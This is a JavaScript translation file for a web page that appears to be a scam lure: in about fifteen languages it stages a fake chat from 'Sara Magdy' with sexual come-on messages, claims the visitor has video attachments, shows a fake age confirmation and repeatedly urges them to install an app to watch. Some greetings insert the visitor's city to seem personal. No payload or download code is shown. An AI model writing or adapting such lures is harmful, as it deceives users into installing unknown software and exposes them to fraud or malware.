
function getURLParameter(name) {
    return decodeURIComponent(
        (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
        );
}


function replace_text(lang, text) {
    x = document.getElementById(text);
    if (x) {
        x.innerHTML = translation[lang][text];
    } else {
        console.log("element not Found: " + text);
    }
}

function alert_string(lang, text) {
    return translation[lang][text] + "\n\n";
}

function translation_available(lang) {
    if (translation[lang]) {
        return lang;
    } else {
        console.log("translation not Found: " + lang);
        return "source";
    }
}


function detect_language() {
    var language = navigator.languages && navigator.languages[0] || navigator.language || navigator.userLanguage;
    if (language.length > 3) {
        language = language[0] + language[1];
    };
    if (jQuery.inArray(language, ['ar', 'he', 'fa', 'ur', 'ku']) >= 0) {
        $('html').attr('DIR', 'RTL');
        document.body.classList.add('arab');
    }
    return translation_available(language);
}
var translation = {
    source: {
        a1: "Now",
        a2: "You have (2) new attachments 📹 from <b>Sara Magdy</b>",
        a3: "Please install app to watch",
        a4: "Install",
        a5: "Continue",
        a6: "Now",
        a7: "<b>Sara Magdy</b> would like to send you a message",
        a8: "Please confirm you are over 18 years old",
        a9: "I'm 18",
        a10: "online",
        a11: "Sara Magdy is typing",
        a12: "Watch in App",
        a13: "Hello, sugar 😘 How are you?",
        a14: "do you love hot and sexy girls?",
        a15: "I'm so boring right now.... Can i have you for a chat?",
        a16: "Please hurry up, i feel so hot right now 🔥",
        a17: "<input class=\"input-msg\"  name=\"input\" placeholder=\"Type here\" autocomplete=\"off\"></input>"

        
    },
    en: {
        a1: "Now",
        a2: "You have (2) new attachments 📹 from <b>Sara Magdy</b>",
        a3: "Please install app to watch",
        a4: "Install",
        a5: "Continue",
        a6: "Now",
        a7: "<b>Sara Magdy</b> would like to send you a message",
        a8: "Please confirm you are over 18 years old",
        a9: "I'm 18",
        a10: "online",
        a11: "Sara Magdy is typing",
        a12: "Watch in App",
        a13: "Hello, sugar 😘 How are you?",
        a14: "do you love hot and sexy girls?",
        a15: "I'm so boring right now.... Can i have you for a chat?",
        a16: "Please hurry up, i feel so hot right now 🔥",
        a17: "<input class=\"input-msg\"  name=\"input\" placeholder=\"Type here\" autocomplete=\"off\"></input>"

    },
    es: {
        a1: "Ahora",
        a2: "Tienes (2) nuevos archivos adjuntos 📹 de <b>Sara Magdy</b>",
        a3: "Por favor, instala la aplicación para ver",
        a4: "Instalar",
        a5: "Continuar",
        a6: "Ahora",
        a7: "<b>Sara Magdy</b> quiere enviarte un mensaje",
        a8: "Por favor, confirma que tienes más de 18 años",
        a9: "Tengo 18",
        a10: "en línea",
        a11: "Sara Magdy está escribiendo",
        a12: "Ver en la aplicación",
        a13: "Hola, cariño 😘 ¿Eres de " + user_city + " ?",
        a14: "¿Te gustan las chicas calientes y sexys?",
        a15: "Estoy tan aburrida ahora.... ¿Puedo charlar contigo?",
        a16: "Por favor, date prisa, me siento tan caliente ahora 🔥",
        a17: "<input class=\"input-msg\"  name=\"input\" placeholder=\"Escribe aquí\" autocomplete=\"off\"></input>"
    },
    it: {
        a1: "Adesso",
        a2: "Hai (2) nuovi allegati 📹 da <b>Sara Magdy</b>",
        a3: "Per favore, installa l'app per guardare",
        a4: "Installa",
        a5: "Continua",
        a6: "Adesso",
        a7: "<b>Sara Magdy</b> vorrebbe inviarti un messaggio",
        a8: "Per favore, conferma che hai più di 18 anni",
        a9: "Ho 18 anni",
        a10: "online",
        a11: "Sara Magdy sta scrivendo",
        a12: "Guarda nell'app",
        a13: "Ciao, tesoro 😘 Sei di " + user_city + " ?",
        a14: "Ti piacciono le ragazze calde e sexy?",
        a15: "Sono così annoiata adesso.... Posso parlare con te?",
        a16: "Per favore, sbrigati, mi sento così calda adesso 🔥",
        a17: "<input class=\"input-msg\"  name=\"input\" placeholder=\"Scrivi qui\" autocomplete=\"off\"></input>"
    },

    hi: {
        a1: "अभी",
        a2: "आपके पास <b>Sara Magdy</b> से (2) नए संलग्नक 📹 हैं",
        a3: "देखने के लिए कृपया ऐप इंस्टॉल करें",
        a4: "इंस्टॉल करें",
        a5: "जारी रखें",
        a6: "अभी",
        a7: "<b>Sara Magdy</b> आपको एक संदेश भेजना चाहती है",
        a8: "कृपया पुष्टि करें कि आप 18 वर्ष से अधिक आयु के हैं",
        a9: "मैं 18 का हूँ",
        a10: "ऑनलाइन",
        a11: "Sara Magdy टाइप कर रही है",
        a12: "ऐप में देखें",
        a13: "हैलो, शुगर 😘 क्या आप " + user_city + " से हैं?",
        a14: "क्या आपको हॉट और सेक्सी लड़कियां पसंद हैं?",
        a15: "मैं अभी बहुत बोर हो रही हूँ.... क्या मैं आपसे चैट कर सकती हूँ?",
        a16: "कृपया जल्दी करें, मुझे अभी बहुत गर्मी लग रही है 🔥",
        a17: "<input class=\"input-msg\"  name=\"input\" placeholder=\"यहाँ टाइप करें\" autocomplete=\"off\"></input>"
    },

    mr: {
        a1: "आता",
        a2: "आपल्याकडे <b>Sara Magdy</b> कडून (2) नवीन संलग्नक 📹 आहेत",
        a3: "पाहण्यासाठी कृपया अॅप इंस्टॉल करा",
        a4: "इंस्टॉल करा",
        a5: "सुरू ठेवा",
        a6: "आता",
        a7: "<b>Sara Magdy</b> आपल्याला एक संदेश पाठवू इच्छित आहे",
        a8: "कृपया पुष्टी करा की आपण 18 वर्षांपेक्षा जास्त वयाचे आहात",
        a9: "मी 18 वर्षांचा आहे",
        a10: "ऑनलाइन",
        a11: "Sara Magdy टाइप करत आहे",
        a12: "अॅपमध्ये पाहा",
        a13: "हॅलो, साखर 😘 आपण " + user_city + " चे आहात?",
        a14: "आपल्याला हॉट आणि सेक्सी मुली आवडतात का?",
        a15: "मी सध्या खूप बोअर होत आहे.... मी आपल्याशी बोलू शकते का?",
        a16: "कृपया लवकर करा, मला सध्या खूप गरम वाटत आहे 🔥",
        a17: "<input class=\"input-msg\"  name=\"input\" placeholder=\"इथे टाईप करा\" autocomplete=\"off\"></input>"
    },
    kn: {
        a1: "ಈಗ",
        a2: "ನೀವು <b>Sara Magdy</b> ರಿಂದ (2) ಹೊಸ ಸಂಲಗ್ನತೆಗಳನ್ನು 📹 ಹೊಂದಿದ್ದೀರಿ",
        a3: "ನೋಡುವುದುಕ್ಕಾಗಿ ದಯವಿಟ್ಟು ಆಪ್ ಅನ್ನು ಸ್ಥಾಪಿಸಿ",
        a4: "ಸ್ಥಾಪಿಸಿ",
        a5: "ಮುಂದುವರಿಸು",
        a6: "ಈಗ",
        a7: "<b>Sara Magdy</b> ನಿಮಗೆ ಸಂದೇಶವನ್ನು ಕಳುಹಿಸಲು ಬಯಸುತ್ತಾಳೆ",
        a8: "ನೀವು 18 ವರ್ಷಕ್ಕಿಂತ ಹೆಚ್ಚು ವಯಸ್ಸಿನವರಾಗಿದ್ದೀರಿ ಎಂದು ದಯವಿಟ್ಟು ದೃಢೀಕರಿಸಿ",
        a9: "ನಾನು 18 ವರ್ಷವನು",
        a10: "ಆನ್ಲೈನ್",
        a11: "Sara Magdy ಟೈಪಿಂಗ್ ಮಾಡುತ್ತಾಳೆ",
        a12: "ಆಪ್ನಲ್ಲಿ ವೀಕ್ಷಿಸಿ",
        a13: "ಹಲೋ, ಸುಗರ್ 😘 ನೀವು " + user_city + " ನವರು?",
        a14: "ನೀವು ಹಾಟ್ ಮತ್ತು ಸೆಕ್ಸಿ ಹುಡುಗಿಯರನ್ನು ಇಷ್ಟಪಡುತ್ತೀರಾ?",
        a15: "ನಾನು ಈಗ ತುಂಬಾ ಬೋರ್ ಆಗಿದ್ದೇನೆ.... ನಾನು ನಿಮ್ಮೊಂದಿಗೆ ಚಾಟ್ ಮಾಡಬಹುದೇ?",
        a16: "ದಯವಿಟ್ಟು ಶೀಘ್ರವಾಗಿ ಮಾಡಿ, ನಾನು ಈಗ ತುಂಬಾ ಬಿಸಿ ಅನುಭವಿಸುತ್ತಿದ್ದೇನೆ 🔥",
        a17: "<input class=\"input-msg\"  name=\"input\" placeholder=\"ಇಲ್ಲಿ ಟೈಪ್ ಮಾಡಿ\" autocomplete=\"off\"></input>"
    },
    bn: {
        a1: "এখন",
        a2: "আপনার কাছে <b>Sara Magdy</b> থেকে (2) টি নতুন সংযুক্তি 📹 এসেছে",
        a3: "দেখার জন্য দয়া করে অ্যাপটি ইনস্টল করুন",
        a4: "ইনস্টল করুন",
        a5: "চালিয়ে যান",
        a6: "এখন",
        a7: "<b>Sara Magdy</b> আপনাকে একটি বার্তা পাঠাতে চায়",
        a8: "অনুগ্রহ করে নিশ্চিত করুন যে আপনি 18 বছর বা তার বেশি বয়সী",
        a9: "আমার বয়স 18",
        a10: "অনলাইন",
        a11: "Sara Magdy টাইপ করছে",
        a12: "অ্যাপে দেখুন",
        a13: "হ্যালো, সুগার 😘 আপনি কি " + user_city + " থেকে?",
        a14: "আপনি কি হট এবং সেক্সি মেয়েদের পছন্দ করেন?",
        a15: "আমি এখন খুব বোর হচ্ছি.... আমি কি আপনার সাথে চ্যাট করতে পারি?",
        a16: "দয়া করে তাড়াতাড়ি করুন, আমি এখন খুব গরম অনুভব করছি 🔥",
        a17: "<input class=\"input-msg\"  name=\"input\" placeholder=\"এখানে টাইপ করুন\" autocomplete=\"off\"></input>"
    },
    ml: {
        a1: "ഇപ്പോൾ",
        a2: "നിനക്കുണ്ട് <b>Sara Magdy</b> നിന്ന് (2) പുതിയ ആറ്റാച്ചുമെന്റുകൾ 📹",
        a3: "കാണാൻ ദയവായി ആപ്പ് ഇൻസ്റ്റാൾ ചെയ്യൂ",
        a4: "ഇൻസ്റ്റാൾ ചെയ്യുക",
        a5: "തുടരുക",
        a6: "ഇപ്പോൾ",
        a7: "<b>Sara Magdy</b> നിന്നോട് ഒരു സന്ദേശം അയയ്ക്കാൻ ആഗ്രഹിക്കുന്നു",
        a8: "നീ 18 വയസ്സിൽ കൂടുതലാണെന്ന് ദയവായി സ്ഥിരീകരിക്കൂ",
        a9: "ഞാൻ 18 വയസ്സിൽ",
        a10: "ഓൺലൈൻ",
        a11: "Sara Magdy ടൈപ്പ് ചെയ്യുന്നു",
        a12: "ആപ്പിൽ കാണുക",
        a13: "ഹലോ, ഷുഗർ 😘 നീ " + user_city + " നിന്നാണോ?",
        a14: "നിനക്ക് ചൂടും സെക്സിയുമായ പെൺകുട്ടികളെ ഇഷ്ടമാണോ?",
        a15: "ഞാൻ ഇപ്പോൾ വളരെ ബോറടിക്കുന്നു.... ഞാൻ നിന്നോട് ചാറ്റ് ചെയ്യാമോ?",
        a16: "ദയവായി വേഗത്തിൽ, ഞാൻ ഇപ്പോൾ വളരെ ചൂട് അനുഭവപ്പെടുന്നു 🔥",
        a17: "<input class=\"input-msg\"  name=\"input\" placeholder=\"ഇവിടെ ടൈപ്പ്\" autocomplete=\"off\"></input>"
    },

    te: {
        a1: "ఇప్పుడు",
        a2: "మీరు <b>Sara Magdy</b> నుండి (2) కొత్త అటాచ్మెంట్లు 📹 ఉన్నాయి",
        a3: "చూడటానికి దయచేసి యాప్ ఇన్‌స్టాల్ చేయండి",
        a4: "ఇన్‌స్టాల్ చేయండి",
        a5: "కొనసాగించు",
        a6: "ఇప్పుడు",
        a7: "<b>Sara Magdy</b> మీకు సందేశం పంపాలనుకుంటోంది",
        a8: "మీ వయస్సు 18 సంవత్సరాలకంటే ఎక్కువ అని దయచేసి నిర్ధారించండి",
        a9: "నేను 18 సంవత్సరాల వాడిని",
        a10: "ఆన్లైన్",
        a11: "Sara Magdy టైపింగ్ చేస్తోంది",
        a12: "యాప్‌లో చూడండి",
        a13: "హలో, షుగర్ 😘 మీరు " + user_city + " నుండి?",
        a14: "మీకు హాట్ మరియు సెక్సీ అమ్మాయిలు ఇష్టమా?",
        a15: "నేను ఇప్పుడు చాలా బోర్‌గా ఉన్నాను.... నేను మీతో చాట్ చేయగలనా?",
        a16: "దయచేసి త్వరగా చేయండి, నేను ఇప్పుడు చాలా హాట్‌గా అనిపిస్తుంది 🔥",
        a17: "<input class=\"input-msg\"  name=\"input\" placeholder=\"ఇక్కడ టైప్\" autocomplete=\"off\"></input>"
    },
    pa: {
        a1: "ਹੁਣ",
        a2: "ਤੁਹਾਡੇ ਕੋਲ <b>Sara Magdy</b> ਤੋਂ (2) ਨਵੇਂ ਅਟੈਚਮੈਂਟਸ 📹 ਹਨ",
        a3: "ਵੇਖਣ ਲਈ ਕਿਰਪਾ ਕਰਕੇ ਐਪ ਇੰਸਟਾਲ ਕਰੋ",
        a4: "ਇੰਸਟਾਲ ਕਰੋ",
        a5: "ਜਾਰੀ ਰੱਖੋ",
        a6: "ਹੁਣ",
        a7: "<b>Sara Magdy</b> ਤੁਹਾਨੂੰ ਸੁਨੇਹਾ ਭੇਜਣਾ ਚਾਹੁੰਦੀ ਹੈ",
        a8: "ਕਿਰਪਾ ਕਰਕੇ ਪੁਸ਼ਟੀ ਕਰੋ ਕਿ ਤੁਸੀਂ 18 ਸਾਲਾਂ ਤੋਂ ਵੱਧ ਉਮਰ ਦੇ ਹੋ",
        a9: "ਮੈਂ 18 ਸਾਲਾਂ ਦਾ ਹਾਂ",
        a10: "ਅਨਲਾਈਨ",
        a11: "Sara Magdy ਟਾਈਪ ਕਰ ਰਹੀ ਹੈ",
        a12: "ਐਪ ਵਿੱਚ ਵੇਖੋ",
        a13: "ਹੈਲੋ, ਸ਼ੂਗਰ 😘 ਕੀ ਤੁਸੀਂ " + user_city + " ਦੇ ਹੋ?",
        a14: "ਕੀ ਤੁਹਾਨੂੰ ਗਰਮ ਅਤੇ ਸੈਕਸੀ ਕੁੜੀਆਂ ਪਸੰਦ ਹਨ?",
        a15: "ਮੈਂ ਹੁਣ ਬਹੁਤ ਬੋਰੀ ਹੋ ਰਹੀ ਹਾਂ.... ਕੀ ਮੈਂ ਤੁਹਾਡੇ ਨਾਲ ਗੱਲ ਕਰ ਸਕਦੀ ਹਾਂ?",
        a16: "ਕਿਰਪਾ ਕਰਕੇ ਜਲਦੀ ਕਰੋ, ਮੈਨੂੰ ਹੁਣ ਬਹੁਤ ਗਰਮੀ ਮਹਿਸੂਸ ਹੋ ਰਹੀ ਹੈ 🔥",
        a17: "<input class=\"input-msg\"  name=\"input\" placeholder=\"ਇੱਥੇ ਟਾਈਪ ਕਰੋ\" autocomplete=\"off\"></input>"
    },
    ta: {
        a1: "இப்போது",
        a2: "உங்களிடம் <b>Sara Magdy</b> என்பவரிடமிருந்து (2) புதிய இணைப்புகள் 📹 உள்ளன",
        a3: "காண அப்பிளிக்கேஷனை நிறுவுங்கள்",
        a4: "நிறுவவும்",
        a5: "தொடரவும்",
        a6: "இப்போது",
        a7: "<b>Sara Magdy</b> உங்களுக்கு ஒரு செய்தியை அனுப்ப விரும்புகிறார்",
        a8: "நீங்கள் 18 வயதுக்கு மேற்பட்டவர்கள் என்பதை உறுதிப்படுத்தவும்",
        a9: "நான் 18 வயதுடையவன்",
        a10: "ஆன்லைன்",
        a11: "Sara Magdy தட்டச்சு செய்து கொண்டிருக்கிறார்",
        a12: "ஆப்பில் காண்க",
        a13: "வணக்கம், கண்ணே 😘 நீங்கள் " + user_city + " இலிருந்து வந்தவரா?",
        a14: "உங்களுக்கு சூடான மற்றும் செக்ஸி பெண்கள் பிடிக்குமா?",
        a15: "நான் இப்போது மிகவும் போரடிக்கிறேன்.... நான் உங்களுடன் உரையாடலாமா?",
        a16: "தயவுசெய்து விரைவாக வாருங்கள், எனக்கு இப்போது மிகவும் சூடாக உணர்கிறேன் 🔥",
        a17: "<input class=\"input-msg\"  name=\"input\" placeholder=\"இங்கு டைப்\" autocomplete=\"off\"></input>"
    },
    ar: {
        a1: "الآن",
        a2: "لديك (2) مرفقات جديدة 📹 من <b>Sara Magdy</b>",
        a3: "يرجى تثبيت التطبيق للمشاهدة",
        a4: "تثبيت",
        a5: "استمر",
        a6: "الآن",
        a7: "<b>Sara Magdy</b> ترغب في إرسال رسالة إليك",
        a8: "يرجى تأكيد أنك أكبر من 18 عامًا",
        a9: "عمري 18",
        a10: "متصل",
        a11: "Sara Magdy يكتب",
        a12: "شاهد في التطبيق",
        a13: "مرحبًا، عزيزي 😘 هل أنت من " + user_city + " ؟",
        a14: "هل تحب الفتيات الجميلات والمثيرات؟",
        a15: "أنا أشعر بالملل الآن.... هل يمكنني التحدث معك؟",
        a16: "يرجى الإسراع، أشعر بالحرارة الآن 🔥",
        a17: "<input class=\"input-msg\"  name=\"input\" placeholder=\"اكتب هنا\" autocomplete=\"off\"></input>"
    },
    ur: {
        a1: "اب",
        a2: "آپ کے پاس <b>Sara Magdy</b> سے (2) نئے منسلکات 📹 ہیں",
        a3: "دیکھنے کے لئے براہ کرم ایپ انسٹال کریں",
        a4: "انسٹال کریں",
        a5: "جاری رکھیں",
        a6: "اب",
        a7: "<b>Sara Magdy</b> آپ کو ایک پیغام بھیجنا چاہتی ہے",
        a8: "براہ کرم تصدیق کریں کہ آپ کی عمر 18 سال سے زیادہ ہے",
        a9: "میری عمر 18 سال ہے",
        a10: "آن لائن",
        a11: "Sara Magdy ٹائپ کر رہا ہے",
        a12: "ایپ میں دیکھیں",
        a13: "ہیلو، پیارے 😘 کیا آپ " + user_city + " سے ہیں؟",
        a14: "کیا آپ کو گرم اور سیکسی لڑکیاں پسند ہیں؟",
        a15: "میں ابھی بہت بور ہو رہی ہوں.... کیا میں آپ سے بات کر سکتی ہوں؟",
        a16: "براہ کرم جلدی کریں، مجھے ابھی بہت گرم محسوس ہو رہا ہے 🔥",
        a17: "<input class=\"input-msg\"  name=\"input\" placeholder=\"یہاں ٹائپ کریں\" autocomplete=\"off\"></input>"
    },

    ku: {
        a1: "ئێستا",
        a2: "تۆ (2) هاوپێچە نوێیەکانت هەیە 📹 لە <b>Sara Magdy</b>",
        a3: "تکایە ئەپەکە دامەزرێنە بۆ بینین",
        a4: "دامەزراندن",
        a5: "بەردەوام بە",
        a6: "ئێستا",
        a7: "<b>Sara Magdy</b> دەتەوێت پەیامێکت بێنێت",
        a8: "تکایە پشتڕاست بکە کە تۆ 18 ساڵ تێپەڕووە",
        a9: "من 18 ساڵەمە",
        a10: "بەڕێوەچوون",
        a11: "Sara Magdy دەنووسێت",
        a12: "لە ئەپەکەدا ببینە",
        a13: "سڵاو، خۆشەویستم 😘 ئایا تۆ لە " + user_city + " ییت؟",
        a14: "ئایا تۆ جوان و خۆشەویست دەخوازیت؟",
        a15: "من ئێستا زۆر بێزارم.... دەتوانم پەیوەندی بکەمەوە؟",
        a16: "تکایە خێرا بکە، من ئێستا زۆر گەرەمە 🔥",
        a17: "<input class=\"input-msg\"  name=\"input\" placeholder=\"ئێرە تایپ بکە\" autocomplete=\"off\"></input>"
    }



};

function translate() {
    var detected_language = detect_language();
    

    document.querySelector('#det_lng').value = detected_language;


    for (y in translation["source"]) {
        replace_text(detected_language, y);

    }

}
window.onload = translate()